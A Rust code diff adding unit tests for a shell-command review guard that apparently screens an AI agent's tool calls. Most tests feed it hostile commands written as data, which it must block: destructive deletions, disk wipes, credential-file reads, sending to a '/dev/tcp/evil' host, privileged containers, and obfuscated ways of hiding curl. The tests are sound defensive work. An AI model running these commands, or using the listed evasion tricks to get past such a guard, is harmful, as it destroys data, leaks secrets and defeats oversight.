@@ -1307,12 +1307,11 @@ fn glob_matches(pattern: &str, name: &str) -> bool {
         } else {
             for (i, ch) in chars.iter().enumerate() {
                 let hit = match tok {
-                    Tok::Any => true,
+                    Tok::Any | Tok::Star => true,
                     Tok::Lit(c) => c == ch,
                     Tok::Class(negated, ranges) => {
                         ranges.iter().any(|(lo, hi)| lo <= ch && ch <= hi) != *negated
                     }
-                    Tok::Star => unreachable!("handled above"),
                 };
                 if state[i] && hit {
                     next[i + 1] = true;
@@ -3719,5 +3718,481 @@ mod tests {
         blocked("gh api x -X $M", "method cannot be resolved");
         blocked("gh api x -H 'X-HTTP-Method-Override: DELETE'", "header");
         blocked("gh api x -H $H", "header");
+    }
+
+    #[test]
+    fn inspect_ignores_tools_it_does_not_review_and_rejects_malformed_arguments() {
+        assert_eq!(inspect("read_file", &json!({})), Ok(()));
+        assert!(inspect("run_command", &json!({}))
+            .unwrap_err()
+            .contains("missing or non-string `command`"));
+        assert!(inspect("run_command", &json!({ "command": 5 }))
+            .unwrap_err()
+            .contains("missing or non-string `command`"));
+    }
+
+    #[test]
+    fn write_file_paths_are_confined_to_the_workspace() {
+        let check = |path: &str| inspect("write_file", &json!({ "path": path, "content": "x" }));
+        assert_eq!(check("src/lib.rs"), Ok(()));
+        assert!(check("/etc/x")
+            .unwrap_err()
+            .contains("outside the workspace"));
+        assert!(check("\\x").unwrap_err().contains("outside the workspace"));
+        assert!(check("C:\\x")
+            .unwrap_err()
+            .contains("outside the workspace"));
+        assert!(check("a/../b")
+            .unwrap_err()
+            .contains("escapes the workspace"));
+        assert!(check("a\\..\\b")
+            .unwrap_err()
+            .contains("escapes the workspace"));
+        assert!(check(".git/config").unwrap_err().contains("git internals"));
+        assert!(check("a/.GIT/hooks/x")
+            .unwrap_err()
+            .contains("git internals"));
+        assert!(inspect("write_file", &json!({ "content": "x" }))
+            .unwrap_err()
+            .contains("missing or non-string `path`"));
+    }
+
+    #[test]
+    fn unterminated_and_unbalanced_syntax_fails_closed() {
+        blocked("echo 'abc", "unterminated quote");
+        blocked("echo \"abc", "unterminated quote");
+        blocked("echo `ls", "unterminated command substitution");
+        blocked("echo $(ls", "unbalanced substitution");
+        blocked("echo ${X", "unbalanced substitution");
+        blocked("cat <(ls", "unbalanced substitution");
+    }
+
+    #[test]
+    fn unresolvable_command_words_fail_closed() {
+        blocked("$UNSET x", "cannot be resolved statically");
+        blocked("$1 x", "cannot be resolved statically");
+        blocked("\"$@\" x", "cannot be resolved statically");
+        blocked("$* x", "cannot be resolved statically");
+        blocked("$# x", "cannot be resolved statically");
+        blocked("$? x", "cannot be resolved statically");
+        blocked("${X:-curl} x", "cannot be resolved statically");
+        blocked("${!X} x", "cannot be resolved statically");
+        blocked("$(echo curl) x", "cannot be resolved statically");
+        blocked("`echo curl` x", "cannot be resolved statically");
+        blocked("*sh x", "cannot be resolved statically");
+        blocked("ba?h x", "cannot be resolved statically");
+        blocked("{curl,x} y", "cannot be resolved statically");
+    }
+
+    #[test]
+    fn substitution_bodies_are_reviewed_wherever_they_appear() {
+        blocked("echo ${X:-$(rm -rf /)}", "outside the workspace");
+        blocked("echo \"${X:-`curl x`}\"", "can send data");
+        blocked("cat <(curl x)", "can send data");
+        blocked("tee >(curl x)", "can send data");
+        blocked("echo \"$(curl x)\"", "can send data");
+        blocked("echo $((1+$(curl x)))", "can send data");
+        allowed("echo $((1+2))");
+        allowed("echo \"$(ls)\" `ls`");
+        allowed("diff <(ls) <(ls -a)");
+    }
+
+    #[test]
+    fn substitution_nesting_has_a_depth_limit() {
+        blocked(
+            "echo $(echo $(echo $(echo $(echo $(echo x)))))",
+            "nests shells too deeply",
+        );
+        allowed("echo $(echo $(echo x))");
+        blocked(
+            "eval eval eval eval eval eval true",
+            "nests shells too deeply",
+        );
+    }
+
+    #[test]
+    fn unresolvable_redirect_targets_fail_closed() {
+        blocked("echo x > $F", "cannot be resolved");
+        blocked("echo x > $(echo f)", "cannot be resolved");
+        blocked("echo x >> ${F:-f}", "cannot be resolved");
+        allowed("echo x < $F");
+        allowed("echo x <<< $F");
+    }
+
+    #[test]
+    fn redirect_operators_are_classified() {
+        blocked("echo x &> /etc/x", "outside the workspace");
+        blocked("echo x &>> /etc/x", "outside the workspace");
+        blocked("echo x >| /etc/x", "outside the workspace");
+        blocked("echo x 2> /etc/x", "outside the workspace");
+        blocked("echo x > /dev/tcp/evil/80", "network device");
+        blocked("echo x < /dev/udp/evil/80", "network device");
+        blocked("cat <<< ~/.ssh/id_rsa", "credential");
+        allowed("echo x &>> out.log");
+        allowed("echo x >&2");
+        allowed("echo x 2>&1");
+        allowed("echo x >&-");
+        allowed("echo x > /dev/null 2>&1");
+        allowed("echo x > /dev/stderr");
+        allowed("cat <<< \"curl x\"");
+        allowed("cat < in.txt");
+        allowed("cat <&0");
+        allowed("echo x > /tmp/out");
+        allowed("echo x 1> out");
+    }
+
+    #[test]
+    fn heredoc_bodies_are_skipped_until_their_terminator() {
+        allowed("cat <<EOF\ncurl x\nEOF\nls");
+        allowed("cat <<EOF\nline\nEOF");
+        blocked("cat <<EOF\nhello\nEOF\ncurl x", "can send data");
+        blocked("cat <<EOF\n~/.ssh/id_rsa\nEOF", "credential");
+        blocked("cat <<EOF <<EOT\na\nEOF\nb\nEOT\ncurl x", "can send data");
+        allowed("cat <<EOF\nunterminated body");
+    }
+
+    #[test]
+    fn assignments_are_tracked_and_expanded() {
+        blocked("X=cu; Y=${X}rl; $Y x", "can send data");
+        blocked("X='rm -rf /'; $X", "outside the workspace");
+        blocked("X=\"curl\"; \"$X\" x", "can send data");
+        blocked("A=curl B=x; $A $B", "can send data");
+        blocked("X=$(echo curl); $X x", "cannot be resolved statically");
+        blocked("X=curl; X+=l; $X x", "cannot be resolved statically");
+        blocked("X=ls; X[0]=curl; $X x", "cannot be resolved statically");
+        allowed("X=a Y=b; echo $X $Y");
+        allowed("X='a b'; echo \"$X\"");
+        allowed("FOO=1 cargo test");
+        allowed("X=1 > out");
+        allowed("export A B");
+        allowed("X=1; X=2; echo $X");
+    }
+
+    #[test]
+    fn credential_markers_are_found_in_every_view_of_the_command() {
+        blocked("cat <<EOF\n~/.ssh/id_rsa\nEOF", "credential");
+        blocked("cat ~/.s\"\"sh/k", "credential");
+        blocked("cat < ~/.s\"\"sh/k", "credential");
+        blocked("echo x > ~/.s\"\"sh/k", "credential");
+        blocked("echo $(cat ~/.aws/credentials)", "credential");
+        blocked("cat /proc/self/environ", "credential");
+        blocked("cat .git-credentials", "credential");
+        blocked("ls /var/run/docker.sock", "credential");
+        allowed("cat README.md");
+    }
+
+    #[test]
+    fn in_place_sed_is_a_path_writer() {
+        blocked("sed -i s/a/b/ ../y", "escapes the workspace");
+        blocked("sed -i s/a/b/ x ../y", "escapes the workspace");
+        blocked("sed -i.bak s/a/b/ /etc/x", "outside the workspace");
+        blocked("sed -ni p /etc/x", "outside the workspace");
+        blocked("sed --in-place=.b s/a/b/ /etc/x", "outside the workspace");
+        blocked("sed -e s/a/b/ -i /etc/x", "outside the workspace");
+        blocked(
+            "sed --expression s/a/b/ --in-place /etc/x",
+            "outside the workspace",
+        );
+        blocked("sed --expression=s/a/b/ -i /etc/x", "outside the workspace");
+        blocked("sed -i -f script.sed /etc/x", "outside the workspace");
+        blocked("sed -i -- s/a/b/ /etc/x", "outside the workspace");
+        allowed("sed -i s/a/b/ file.txt");
+        allowed("sed -i '/foo/d' file.txt");
+        allowed("sed -n p ../x");
+        allowed("sed -i");
+    }
+
+    #[test]
+    fn path_writers_check_every_target() {
+        blocked("cp a /etc/x", "outside the workspace");
+        blocked("mv a ../b", "escapes the workspace");
+        blocked("mkdir ~/x", "home directory");
+        blocked("touch .GIT/x", "git internals");
+        blocked("ln -s a /etc/x", "outside the workspace");
+        blocked("install -m 755 a /usr/bin/x", "outside the workspace");
+        blocked("chmod 777 /etc/x", "outside the workspace");
+        blocked("tee /etc/x", "outside the workspace");
+        blocked("touch /tmp/", "outside the workspace");
+        blocked("touch //etc/x", "outside the workspace");
+        blocked("echo x | tee out.sh | cat; ./out.sh", "written earlier");
+        blocked("cp a b; ./b", "written earlier");
+        blocked("echo x > f; ./f", "written earlier");
+        blocked("mv a b; bash -c ./b ; ./b", "written earlier");
+        allowed("touch /tmp/x /var/tmp/y");
+        allowed("touch .");
+        allowed("cp a b; ./c");
+        allowed("mkdir -p a/b && touch a/b/c");
+        allowed("chmod +x build.sh");
+        allowed("tee out.log < in");
+    }
+
+    #[test]
+    fn rm_is_confined_and_non_recursive_flags_are_respected() {
+        blocked("rm -rf /", "outside the workspace");
+        blocked("rm -rf ~", "home directory");
+        blocked("rm -rf $HOME", "cannot be resolved");
+        blocked("rm -rf .", "destructive");
+        blocked("rm -rf ./", "destructive");
+        blocked("rm -rf ../x", "escapes the workspace");
+        blocked("rm -rf .git", "git internals");
+        blocked("rm -rf a/.git/b", "git internals");
+        blocked("rm --recursive --force /etc", "outside the workspace");
+        blocked("rm -r --no-preserve-root /", "no-preserve-root");
+        blocked("rm -rf -- /etc", "outside the workspace");
+        blocked("rm -R .", "destructive");
+        allowed("rm -f a b");
+        allowed("rm -rf target build");
+        allowed("rm -- -weird");
+    }
+
+    #[test]
+    fn find_with_deletion_or_execution_is_confined() {
+        blocked("find / -delete", "outside the workspace");
+        blocked("find /etc -exec rm {} ;", "outside the workspace");
+        blocked("find $D -delete", "deletes or executes");
+        blocked("find . -exec curl {} ;", "can send data");
+        blocked("find . -exec curl {} +", "can send data");
+        blocked("find . -execdir rm -rf / ;", "outside the workspace");
+        allowed("find . -name '*.rs'");
+        allowed("find / -name x");
+        allowed("find . -exec echo {} ;");
+        allowed("find ! -name x -print");
+        allowed("find ( -name x ) -print");
+        allowed("find . -delete");
+    }
+
+    #[test]
+    fn dangerous_programs_are_refused_by_name() {
+        for (command, needle) in [
+            ("sudo ls", "escalates privileges"),
+            ("mkfs.ext4 /dev/sda1", "destructive to storage"),
+            ("dd if=/dev/zero of=/dev/sda", "destructive to storage"),
+            ("systemctl stop x", "changes system state"),
+            ("kubectl get pods", "publishes or deploys"),
+            ("printenv", "dumps the environment"),
+            ("xargs rm", "cannot be reviewed"),
+            ("ls | xargs chmod 777", "cannot be reviewed"),
+            ("/usr/bin/curl x", "can send data"),
+            ("CURL x", "can send data"),
+            ("kill -1", "every process"),
+            ("kill 0", "every process"),
+            ("source x.sh", "sources a script"),
+            (". x.sh", "sources a script"),
+            ("alias ll='ls -l'", "alias"),
+        ] {
+            blocked(command, needle);
+        }
+        allowed("kill 1234");
+        allowed("xargs ls");
+        allowed("xargs -n 1 echo");
+    }
+
+    #[test]
+    fn publishing_subcommands_are_refused() {
+        blocked("cargo publish", "publishes outside the workspace");
+        blocked("cargo +nightly publish", "publishes outside the workspace");
+        blocked("npm publish", "publishes outside the workspace");
+        blocked("npm --silent publish", "publishes outside the workspace");
+        blocked("pip upload x", "publishes outside the workspace");
+        blocked("docker push img", "publishes images");
+        blocked("docker login", "publishes images");
+        allowed("cargo test publish");
+        allowed("cargo build --release");
+        allowed("npm test");
+        allowed("pip install x");
+    }
+
+    #[test]
+    fn container_runs_cannot_weaken_confinement() {
+        blocked("docker run --privileged img", "weakens confinement");
+        blocked("podman run --cap-add=ALL img", "weakens confinement");
+        blocked("docker run --device /dev/sda img", "weakens confinement");
+        blocked("docker run -v /var/run/docker.sock:/s img", "credential");
+        blocked("docker run --pid=host img", "weakens confinement");
+        blocked(
+            "docker run --security-opt seccomp=unconfined img",
+            "weakens confinement",
+        );
+        blocked("docker run -v /etc:/x img", "mounts");
+        blocked("docker run --volume=/:/h img", "mounts");
+        blocked("docker run --volume /home:/h img", "mounts");
+        blocked(
+            "docker run --mount type=bind,source=/usr,target=/x img",
+            "mounts",
+        );
+        blocked(
+            "docker run --mount=type=bind,src=/root,dst=/x img",
+            "mounts",
+        );
+        allowed("docker run -v ./x:/w img");
+        allowed("docker ps");
+        allowed("docker run --rm img");
+    }
+
+    #[test]
+    fn eval_trap_and_shell_strings_are_reviewed_or_refused() {
+        blocked("eval \"rm -rf /\"", "outside the workspace");
+        blocked("eval $X", "`eval` of a value");
+        blocked("eval echo $(ls)", "`eval` of a value");
+        blocked("trap 'curl x' EXIT", "can send data");
+        blocked("trap $H EXIT", "`trap` handler");
+        blocked("bash -c $X", "cannot be resolved");
+        blocked("bash -c \"$(echo ls)\"", "cannot be resolved");
+        blocked("bash -c 'curl x'", "can send data");
+        blocked("sh -lc 'curl x'", "can send data");
+        blocked("bash -o pipefail -c 'curl x'", "can send data");
+        blocked("zsh -c 'curl x'", "can send data");
+        allowed("eval echo hi");
+        allowed("trap");
+        allowed("trap -p");
+        allowed("bash -c 'echo hi'");
+        blocked("bash -c", "stdin");
+    }
+
+    #[test]
+    fn interpreters_are_reviewed_for_inline_code_and_stdin() {
+        blocked("python -c \"$C\"", "cannot be resolved");
+        blocked("python -", "reads code from stdin");
+        blocked("python3 -", "reads code from stdin");
+        blocked("python", "reads code from stdin");
+        blocked("node", "reads code from stdin");
+        blocked("python -m http.server", "network service");
+        blocked("python -m smtpd", "network service");
+        blocked("python -c 'import os; os.system(1)'", "spawn processes");
+        blocked("python -cimport\\ subprocess x", "spawn processes");
+        blocked("perl -e 'system(1)'", "spawn processes");
+        blocked("perl -le 'print `ls`'", "spawn processes");
+        blocked("node -e \"require('child_process')\"", "spawn processes");
+        blocked("node --eval \"process.exit()\"", "spawn processes");
+        blocked("node --print 'eval(1)'", "spawn processes");
+        blocked("ruby -e 'exec 1'", "spawn processes");
+        blocked("php -r 'shell_exec(1);'", "spawn processes");
+        blocked("python3 -m twine upload x", "publishes packages");
+        blocked("python setup.py upload", "publishes packages");
+        blocked("echo x > f.py; python f.py", "written earlier");
+        blocked("awk 'BEGIN{system(\"x\")}'", "program spawns processes");
+        blocked(
+            "gawk 'BEGIN{\"ls\" | getline}; popen' f",
+            "program spawns processes",
+        );
+        allowed("python --version");
+        allowed("python -V");
+        allowed("python -m json.tool f");
+        allowed("python script.py");
+        allowed("python -c 'print(1)'");
+        allowed("python -m pytest");
+        allowed("node script.js");
+        allowed("node -e 'console.log(1)'");
+        allowed("perl -e 'print 1'");
+        allowed("awk '{print $1}' f");
+        blocked("python -c", "reads code from stdin");
+        allowed("python -u script.py");
+    }
+
+    #[test]
+    fn shell_syntax_forms_are_parsed() {
+        allowed("# curl x");
+        allowed("echo a#b");
+        allowed("! true");
+        allowed("while false; do :; done");
+        allowed("until true; do :; done");
+        allowed("case x in a) echo a;; b) echo b;; esac");
+        allowed("select i in a b; do echo $i; done");
+        allowed("echo hi |& cat");
+        allowed("echo \\");
+        allowed("echo a\\\nb");
+        blocked("cu\\\nrl x", "can send data");
+        blocked("echo a |& curl x", "can send data");
+        blocked("true & curl x", "can send data");
+        blocked("false || curl x", "can send data");
+        blocked("echo a\ncurl x", "can send data");
+        blocked("echo \"a\\\"b\"; curl x", "can send data");
+        blocked("echo \"a\\\nb\"; curl x", "can send data");
+        blocked("echo \"a\\qb\"; curl x", "can send data");
+        blocked("echo $; curl x", "can send data");
+        blocked("echo a$; curl x", "can send data");
+        blocked("echo '$(x' ; curl x", "can send data");
+        blocked("echo \"$(echo \")\")\"; curl x", "can send data");
+        blocked("echo $(echo \\) ); curl x", "can send data");
+        blocked("echo `echo \\`x\\``; curl x", "can send data");
+    }
+
+    #[test]
+    fn path_helpers_normalise_consistently() {
+        assert_eq!(normalise("/"), "/");
+        assert_eq!(normalise("//"), "/");
+        assert_eq!(normalise(""), ".");
+        assert_eq!(normalise("./"), ".");
+        assert_eq!(normalise("a//b/./c/"), "a/b/c");
+        assert_eq!(normalise("/A/B"), "/a/b");
+        assert!(tmp_path("/tmp/x"));
+        assert!(tmp_path("/var/tmp/x"));
+        assert!(!tmp_path("/tmp"));
+        assert!(!tmp_path("/var/tmp"));
+        assert!(!tmp_path("/tmpx/y"));
+        assert_eq!(path_escape("~/x"), Some("targets the home directory"));
+        assert_eq!(path_escape("$X/y"), Some("expands a variable"));
+        assert_eq!(path_escape("a/../b"), Some("escapes the workspace"));
+        assert_eq!(path_escape("a/.git/b"), Some("touches git internals"));
+        assert_eq!(path_escape("/etc/x"), Some("is outside the workspace"));
+        assert_eq!(path_escape("/tmp/x"), None);
+        assert_eq!(path_escape("src/lib.rs"), None);
+    }
+
+    #[test]
+    fn glob_matching_supports_classes_ranges_and_negation() {
+        assert!(glob_matches(".g*", ".git"));
+        assert!(glob_matches(".gi?", ".git"));
+        assert!(glob_matches(".[g]it", ".git"));
+        assert!(glob_matches(".[a-h]it", ".git"));
+        assert!(glob_matches(".[!a-f]it", ".git"));
+        assert!(glob_matches(".[^a-f]it", ".git"));
+        assert!(glob_matches(".*", ".git"));
+        assert!(glob_matches(".[]g]it", ".git"));
+        assert!(glob_matches(".[a-]it", ".-it"));
+        assert!(glob_matches(".g[i", ".g[i"));
+        assert!(glob_matches("*", ""));
+        assert!(!glob_matches(".[!g]it", ".git"));
+        assert!(!glob_matches(".[a-f]it", ".git"));
+        assert!(!glob_matches(".g", ".git"));
+        assert!(!glob_matches(".gitx", ".git"));
+        assert!(!glob_matches("?", ""));
+        assert!(!glob_matches(".x*", ".git"));
+    }
+
+    #[test]
+    fn the_nested_depth_guard_applies_to_direct_word_inspection() {
+        let env = Env {
+            scope: Rc::new(Scope::default()),
+            budget: Budget::new(),
+            cwd: Cwd::start(),
+        };
+        let word = Word {
+            text: "ls".to_string(),
+            dynamic: false,
+            glob: false,
+            quoted: false,
+        };
+        let error = inspect_words(&[word], &env, MAX_NESTING + 1, &mut HashSet::new()).unwrap_err();
+        assert!(error.contains("nests shells too deeply"));
+    }
+    #[test]
+    fn remaining_parser_branches_are_exercised() {
+        blocked(&"echo x;".repeat(1100), "too many parts");
+        allowed("(ls) && ls");
+        allowed("echo \"`ls`\"");
+        allowed("echo $'\\a\\b\\e\\E\\f\\r\\v\\\\\\'\\\"\\?'");
+        blocked("$'\\U00000063url' x", "can send data");
+        allowed("echo $(echo ')')");
+        allowed("echo $(echo \"a\\\"b\")");
+        allowed("echo $(echo a\\)b)");
+        blocked("X[0=1", "cannot be resolved statically");
+        allowed("cd /tmp/x; cd y; touch f");
+        blocked("cd $X; cd y; rm -rf z", "directory change");
+        blocked("cd /etc; echo x > shadow", "credential");
+        allowed("env --unset HOME ls");
+        allowed("env --chdir=sub ls");
+        allowed("env --chdir sub ls");
+        allowed("find . -fprint");
     }
 }
